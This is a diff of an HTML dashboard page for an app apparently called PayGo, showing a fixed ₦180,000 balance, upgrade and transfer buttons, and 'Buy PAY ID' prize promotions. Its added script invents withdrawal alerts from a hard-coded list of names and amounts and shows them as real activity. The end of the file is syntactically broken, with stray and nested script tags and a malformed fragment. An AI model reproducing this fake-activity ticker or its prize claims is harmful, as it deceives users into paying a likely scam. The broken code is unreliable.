@@ -2,146 +2,445 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>PayGo Dashboard</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
     body {
       margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f9f8ff;
+      font-family: 'Inter', sans-serif;
+      background: #f7f0fc;
+      color: #000;
     }
-    .alert {
-      background-color: #fff0f0;
-      color: #d60000;
-      font-weight: bold;
-      padding: 10px 15px;
+    .user-register-banner {
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      text-align: center;
+      padding: 8px;
+      font-weight: 600;
       font-size: 14px;
-      text-align: left;
+      color: #444;
     }
-    .card {
-      background: #781ec5;
+    .header-card {
+      background: #7c20e6;
       color: white;
-      border-radius: 20px;
-      margin: 20px;
-      padding: 20px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      margin: 16px;
+      border-radius: 12px;
+      padding: 20px 24px;
+      position: relative;
+      box-shadow: 0 6px 10px rgb(124 32 230 / 0.5);
     }
-    .card .name {
-      font-size: 18px;
-      margin: 5px 0;
-    }
-    .card .balance {
-      font-size: 30px;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-    .buttons {
+    .header-top {
       display: flex;
+      align-items: center;
       justify-content: space-between;
-      margin-top: 20px;
     }
-    .buttons button {
-      width: 48%;
-      padding: 12px;
-      border: none;
-      border-radius: 30px;
-      font-size: 16px;
-      font-weight: bold;
-      color: white;
-      background-color: #9336fd;
+    .header-top-left {
+      display: flex;
+      align-items: center;
+    }
+    .profile-circle {
+      width: 40px;
+      height: 40px;
+      background: white;
+      color: #7c20e6;
+      font-weight: 700;
+      font-size: 20px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+    }
+    .header-greeting {
+      font-weight: 600;
+      font-size: 20px;
+    }
+    .header-greeting span {
+      font-size: 22px;
+    }
+    .welcome-back {
+      font-size: 14px;
+      opacity: 0.75;
+    }
+    .notification-bell {
+      background: rgba(255 255 255 / 0.2);
+      border-radius: 50%;
+      width: 38px;
+      height: 38px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       cursor: pointer;
+      position: relative;
     }
-    .features {
+    .notification-bell svg {
+      fill: #fff;
+      width: 22px;
+      height: 22px;
+    }
+    .notification-bell .red-dot {
+      width: 8px;
+      height: 8px;
+      background: #ff3838;
+      border-radius: 50%;
+      position: absolute;
+      top: 8px;
+      right: 8px;
+    }
+    .balance-label {
+      margin-top: 18px;
+      font-weight: 400;
+      font-size: 15px;
+      opacity: 0.85;
+    }
+    .balance-amount {
+      font-weight: 700;
+      font-size: 36px;
+      margin-top: 6px;
+      display: flex;
+      align-items: center;
+    }
+    .currency {
+      font-weight: 400;
+      font-size: 24px;
+      margin-right: 6px;
+      text-decoration: line-through;
+    }
+    .weekly-rewards {
+      margin-top: 6px;
+      font-size: 13px;
+      opacity: 0.75;
+    }
+    .eye-icon {
+      cursor: pointer;
+      margin-left: 12px;
+    }
+    .eye-icon svg {
+      fill: #fff;
+      width: 24px;
+      height: 24px;
+    }
+    .header-buttons {
+      margin-top: 24px;
+      display: flex;
+      gap: 20px;
+    }
+    .header-button {
+      background: #9b4bf9;
+      border-radius: 30px;
+      padding: 10px 24px;
+      font-weight: 600;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      border: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: background 0.25s ease;
+    }
+    .header-button:hover {
+      background: #a463f8;
+    }
+    .header-button svg {
+      fill: white;
+      width: 18px;
+      height: 18px;
+    }
+    .menu-grid {
+      margin: 30px 20px 10px;
       display: grid;
       grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
       text-align: center;
-      gap: 10px;
-      margin: 10px 20px;
     }
-    .features div {
-      font-size: 14px;
+    .menu-item {
       cursor: pointer;
+      font-size: 13px;
+      color: #222;
+      user-select: none;
     }
-    .promotions {
-      margin: 20px;
+    .menu-item svg, .menu-item img {
+      width: 30px;
+      height: 30px;
+      margin-bottom: 8px;
+      filter: drop-shadow(0 0 0.5px rgba(0,0,0,0.12));
     }
-    .slider {
-      background-color: #ededff;
-      border-radius: 15px;
-      padding: 15px;
-      min-height: 80px;
-      color: #333;
-      font-weight: bold;
-      animation: slidePromo 10s infinite;
+    .section-title {
+      font-weight: 700;
+      font-size: 20px;
+      margin: 24px 20px 8px;
     }
-    @keyframes slidePromo {
-      0% {opacity: 0; transform: translateX(20px);}
-      10% {opacity: 1; transform: translateX(0);}
-      90% {opacity: 1;}
-      100% {opacity: 0; transform: translateX(-20px);}
+    .carousel {
+      margin: 0 20px 40px;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+    .carousel img {
+      width: 100%;
+      display: block;
+      border-radius: 12px;
+    }
+    @media (max-width: 480px) {
+      .header-buttons {
+        flex-direction: column;
+        gap: 12px;
+      }
+      .menu-grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
     }
   </style>
 </head>
 <body>
 
-  <div class="alert">
-    ❗ ith Opay bank transfers. Please use other banks for your payment
-  </div>
+<div class="user-register-banner">
+  <div class="announcement">
+  <span class="announcement-text">⚡️ Important Announcements:The Opay bank service is currently experiencing issues. Please use other supported banks for your payment! ⚡️</span>
+</div>
+<!-- Animated Withdrawal Announcement -->
+<div id="announcement-bar" style="background:#fffbe6;padding:10px;text-align:center;display:none;font-weight:600;color:#333;">
+  <div id="announcement-text" class="fade-slide"></div>
+</div>
 
-  <div class="card">
-    <div style="display: flex; justify-content: space-between; align-items: center;">
+<style>
+  .fade-slide {
+    opacity: 0;
+    transform: translateY(-10px);
+    transition: opacity 0.6s ease, transform 0.6s ease;
+  }
+  .fade-slide.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+</style>
+
+<script>
+  if (!localStorage.getItem("withdrawals")) {
+    localStorage.setItem("withdrawals", JSON.stringify([
+      { name: "Arabmoney", amount: 180000 },
+      { name: "maryam", amount: 90000 },
+      { name: "sale", amount: 120000 },
+      { name: "Ada", amount: 105000 },
+      { name: "Emmanuel", amount: 190000 },
+      { name: "sunday", amount: 150000 },
+      { name: "liberty", amount: 100000 },
+      { name: "sabastine", amount: 180000 },
+      { name: "Adebayo", amount: 170000},
+      
+    ]));
+  }
+
+  let w = JSON.parse(localStorage.getItem("withdrawals") || "[]").slice(-5);
+  if (w.length) {
+    let i = 0;
+    const bar = document.getElementById("announcement-bar");
+    const text = document.getElementById("announcement-text");
+    bar.style.display = "block";
+
+    function showNext() {
+      text.classList.remove("show");
+      setTimeout(() => {
+        let item = w[i];
+        text.textContent = `${item.name.toUpperCase()} just now withdraw ₦${Number(item.amount).toLocaleString()}`;
+        text.classList.add("show");
+        i = (i + 1) % w.length;
+      }, 300);
+    }
+
+    showNext();
+    setInterval(showNext, 30000); // every 4 seconds
+  }
+</script>
+<style>
+  .announcement {
+    width: 100%;
+    overflow: hidden;
+    background: #fffae6;
+    color: #333;
+    font-weight: 600;
+    font-size: 1.2rem;
+    padding: 10px 0;
+    box-sizing: border-box;
+    position: relative;
+  }
+
+  .announcement-text {
+    display: inline-block;
+    white-space: nowrap;
+    animation: slideBackForth 8s ease-in-out infinite;
+  }
+
+  @keyframes slideBackForth {
+    0% {
+      transform: translateX(0);
+    }
+    50% {
+      transform: translateX(calc(100% - 100vw));
+    }
+    100% {
+      transform: translateX(0);
+    }
+  }
+</style>
+</div>
+
+  }
+</script>
+<div class="header-card">
+  <div class="header-top">
+    <div class="header-top-left">
+      <div class="profile-circle">K</div>
       <div>
-        <div class="name">Hi, <span id="userName">User</span> 👋</div>
-        <div>Welcome back!</div>
-      </div>
-      <div>
-        <img src="bell.png" alt="bell" width="24">
+        <div class="header-greeting">Hi,Good Morning <span>👋</span></div>
+        <div class="welcome-back">Welcome back!</div>
       </div>
     </div>
-    <div style="margin-top: 15px;">
-      <div>Your Balance</div>
-      <div class="balance">₦180,000.00</div>
-      <div style="font-size: 14px;">Weekly Rewards: ₦180,000.00</div>
-    </div>
-    <div class="buttons">
-      <button onclick="location.href='earn.html'">Upgrade</button>
-      <button onclick="location.href='withdraw.html'">Transfer</button>
+    <div class="notification-bell" onclick="location.href='history.html'">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 24c1.104 0 2-.896 2-2h-4c0 1.104.896 2 2 2zM18 16v-5c0-3.074-1.639-5.636-4.5-6.32V4a1.5 1.5 0 10-3 0v.68C7.639 5.364 6 7.926 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
+      <div class="red-dot"></div>
     </div>
   </div>
 
-  <div class="features">
-    <div onclick="location.href='buy.html'">💳<br>Buy PAY ID</div>
-    <div onclick="location.href='watch.html'">📺<br>Watch</div>
-    <div onclick="location.href='airtime.html'">📶<br>Airtime</div>
-    <div onclick="location.href='data.html'">🛢️<br>Data</div>
-    <div onclick="location.href='support.html'">🎧<br>Support</div>
-    <div onclick="location.href='group.html'">🌐<br>Group</div>
-    <div onclick="location.href='earn.html'">💰<br>Earn More</div>
-    <div onclick="location.href='profile.html'">👤<br>Profile</div>
+  <div class="balance-label">Your Balance</div>
+  <div class="balance-amount" id="balance-display">
+    <span class="currency">₦</span><span id="balance-amount">180,000.00</span>
+    <span class="eye-icon" onclick="toggleBalanceVisibility()" title="Toggle balance visibility">
+      <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/></svg>
+      <svg id="eye-closed" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="display:none"><path d="M1 1l22 22M4.31 4.31C2.13 6.49 1 9.09 1 11c0 0 3 7 10 7 2.46 0 4.61-.9 6.24-2.37L18.18 18c-1.3.86-2.85 1.37-4.18 1.37-5 0-7-4-7-4a9.4 9.4 0 013.24-2.67l-4.1-4.1z"/></svg>
+    </span>
   </div>
+  <div class="weekly-rewards">Weekly Rewards: ₦180,000.00</div>
 
-  <div class="promotions">
-    <div class="slider" id="promoSlider">🔥 Mobile Money Promo - AUG 27–28 (Zamtel, Airtel, MTN)</div>
+  <div class="header-buttons">
+    <button class="header-button" onclick="location.href='earn.html'">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16 9l-4 4-4-4"/></svg> Upgrade
+    </button>
+    <button class="header-button" onclick="location.href='withdraw.html'">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 16l4-4H8z"/></svg> Transfer
+    </button>
   </div>
+</div>
+
+<div class="menu-grid">
+  <div class="menu-item" onclick="location.href='buy.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M20 6H4v12h16V6zm-2 9h-4v-2h4v2zm0-4h-4V9h4v2z"/></svg><div>Buy PAY ID</div></div>
+  <div class="menu-item" onclick="location.href='watch.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M21 6h-6l-2-2H9L7 6H3v12h18V6zM9 16l4-4-4-4v8z"/></svg><div>Watch</div></div>
+  <div class="menu-item" onclick="location.href='airtime.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 20c4.418 0 8-2.239 8-5v-2c0-2.761-3.582-5-8-5s-8 2.239-8 5v2c0 2.761 3.582 5 8 5z"/></svg><div>Airtime</div></div>
+  <div class="menu-item" onclick="location.href='data.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M3 12h18v6H3z"/></svg><div>Data</div></div>
+  <div class="menu-item" onclick="location.href='support.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2zm1 15h-2v-2h2zm0-4h-2V7h2z"/></svg><div>Support</div></div>
+  <div class="menu-item" onclick="location.href='group.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M16 11a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-8 3v2H4v-2zm12 0v2h-4v-2z"/></svg><div>Group</div></div>
+  <div class="menu-item" onclick="location.href='earn.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><path d="M12 8l6 4-6 4V8z"/></svg><div>Earn More</div></div>
+  <div class="menu-item" onclick="location.href='profile.html'"><svg xmlns="http://www.w3.org/2000/svg" fill="#7c20e6" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 8-4 8-4s8 0 8 4z"/></svg><div>Profile</div></div>
+</div>
+
+<div style="font-family:sans-serif;">
+  <h3>Current Promotions</h3>
+  <div id="promo" style="overflow:hidden;border-radius:16px;width:100%;max-width:500px;margin:auto;position:relative;">
+  <div id="slides" style="display:flex;transition:transform 0.6s ease;width:300%;">
+  <div style="width:100%;flex-shrink:0;background:#8b5cf6;color:#fff;padding:20px;">
+  <h4>Win Big with PayID</h4>
+    <p>Buy Your PayID today and stand a chance 
+     to win ₦50,000 weekly !</p>
+  </div>
+    <div style="width:100%;flex-shrink:0;background:#8b5cf6;color:#fff;padding:20px;">
+    <h4>Data & Airtime Deals!</h4>
+    <p>Get the best rates on airtime and data
+     purchase. Save up to 15%!</p>
+  </div>
+    <div style="width:100%;flex-shrink:0;background:#8b5cf6;color:#fff;padding:20px;">
+    <h4>Instant Transfers</h4>
+    <p>Send money to any Nigerian bank account instantly with zero fees!</p>
+  </div>
+    </div>
+    <div style="position:absolute;bottom:10px;left:50%;transform:translateX(-50%);display:flex;gap:6px;">
+      <div id="dot0" style="width:8px;height:8px;border-radius:50%;background:#fff;"></div>
+      <div id="dot1" style="width:8px;height:8px;border-radius:50%;background:#ccc;"></div>
+      <div id="dot2" style="width:8px;height:8px;border-radius:50%;background:#ccc;"></div>
+    </div>
+   </div>
+   </div>
 
   <script>
-    // Simulate user's name from registration
-    const registeredName = localStorage.getItem("userName") || "Khalifah";
-    document.getElementById("userName").textContent = registeredName;
+  let index = 0;
+  setInterval(() => {
+    index = (index + 1) % 3;
+    document.getElementById('slides').style.transform = `translateX(-${index * 100}%)`;
+    for (let i = 0; i < 3; i++) {
+      document.getElementById('dot' + i).style.background = (i === index) ? '#fff' : '#ccc';
+    }
+  }, 3000);
+</script>
+<script>
+  function toggleBalanceVisibility() {
+    const balance = document.getElementById('balance-amount');
+    const eyeOpen = document.getElementById('eye-open');
+    const eyeClosed = document.getElementById('eye-closed');
+    if (balance.style.filter === 'blur(8px)') {
+      balance.style.filter = 'none';
+      eyeOpen.style.display = 'inline';
+      eyeClosed.style.display = 'none';
+    } else {
+      balance.style.filter = 'blur(8px)';
+      eyeOpen.style.display = 'none';
+      eyeClosed.style.display = 'inline';
+    }
+  }
 
-    // Text-based auto-slider
-    const promos = [
-      "🔥 Mobile Money Promo - AUG 27–28 (Zamtel, Airtel, MTN)",
-      "💸 Get ₦500 back every week with PAY ID",
-      "🎉 Refer friends & earn ₦1,000 each",
-      "🆓 Free data on first PAY ID purchase",
-    ];
-    let current = 0;
-    setInterval(() => {
-      current = (current + 1) % promos.length;
-      document.getElementById("promoSlider").textContent = promos[current];
-    }, 4000);
-  </script>
+  // Calculate new balance
+  <script>
+  // Set starting balance (only once, or when needed)
+  const startingBalance = 180000;
 
-</body>
-</html>
+  // Get transactions from localStorage
+  let transactions = JSON.parse(localStorage.getItem("transactions") || "[]");
+
+  // Calculate total spent
+  let totalSpent = 0;
+  transactions.forEach(tx => {
+    totalSpent += Number(tx.amount);
+  });
+
+  // Calculate new balance
+  let newBalance = startingBalance - totalSpent;
+
+  // Save the new balance to localStorage
+  localStorage.setItem("balance", newBalance);
+
+  // Display the balance on the page
+  document.getElementById("balance-amount").textContent =
+    newBalance.toLocaleString("en-NG", { style: "currency", currency: "NGN" });
+   function toggleBalance() {
+    const balance = document.getElementById("balance-amount");
+    const eyeOpen = document.getElementById("eye-open");
+    const eyeClosed = document.getElementById("eye-closed");
+
+    if (balance.textContent.includes("•")) {
+      // Show balance
+      const value = localStorage.getItem("balance") || 180000;
+      balance.textContent = Number(value).toLocaleString();
+      eyeOpen.style.display = "inline";
+      eyeClosed.style.display = "none";
+    } else {
+      // Hide balance
+      balance.textContent = "••••••";
+      eyeOpen.style.display = "none";
+      eyeClosed.style.display = "inline";
+    }
+  }
+
+  window.addEventListener("DOMContentLoaded", () => {
+    const value = localStorage.getItem("balance") || 180000;
+    document.getElementById("balance-amount").textContent = Number(value).toLocaleString();
+
+    // Set initial visibility of eye icons
+    const eyeOpen = document.getElementById("eye-open");
+    const eyeClosed = document.getElementById("eye-closed");
+    if (eyeOpen && eyeClosed) {
+      eyeOpen.style.display = "inline";
+      eyeClosed.style.display = "none";
+      {minimuFractionDigit: 2 });
+      </script>  
+
+      </body>
+      </html>
